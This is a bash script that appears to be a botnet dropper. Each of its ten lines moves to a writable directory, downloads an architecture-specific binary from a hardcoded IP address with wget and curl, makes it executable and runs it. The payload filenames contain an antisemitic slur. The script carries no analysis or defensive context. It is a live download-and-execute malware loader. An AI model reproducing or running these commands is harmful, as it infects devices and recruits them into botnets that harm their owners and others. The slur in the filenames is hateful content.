#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://171.22.30.172/bins/jew.x86; curl -O http://171.22.30.172/bins/jew.x86;cat jew.x86 >jewn;chmod +x *;./jewn
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://171.22.30.172/bins/jew.mips; curl -O http://171.22.30.172/bins/jew.mips;cat jew.mips >jewn;chmod +x *;./jewn
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://171.22.30.172/bins/jew.mpsl; curl -O http://171.22.30.172/bins/jew.mpsl;cat jew.mpsl >jewn;chmod +x *;./jewn
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://171.22.30.172/bins/jew.arm4; curl -O http://171.22.30.172/bins/jew.arm4;cat jew.arm4 >jewn;chmod +x *;./jewn
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://171.22.30.172/bins/jew.arm5; curl -O http://171.22.30.172/bins/jew.arm5;cat jew.arm5 >jewn;chmod +x *;./jewn
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://171.22.30.172/bins/jew.arm6; curl -O http://171.22.30.172/bins/jew.arm6;cat jew.arm6 >jewn;chmod +x *;./jewn
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://171.22.30.172/bins/jew.arm7; curl -O http://171.22.30.172/bins/jew.arm7;cat jew.arm7 >jewn;chmod +x *;./jewn
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://171.22.30.172/bins/jew.ppc; curl -O http://171.22.30.172/bins/jew.ppc;cat jew.ppc >jewn;chmod +x *;./jewn
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://171.22.30.172/bins/jew.m68k; curl -O http://171.22.30.172/bins/jew.m68k;cat jew.m68k >jewn;chmod +x *;./jewn
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://171.22.30.172/bins/jew.sh4; curl -O http://171.22.30.172/bins/jew.sh4;cat jew.sh4 >jewn;chmod +x *;./jewn
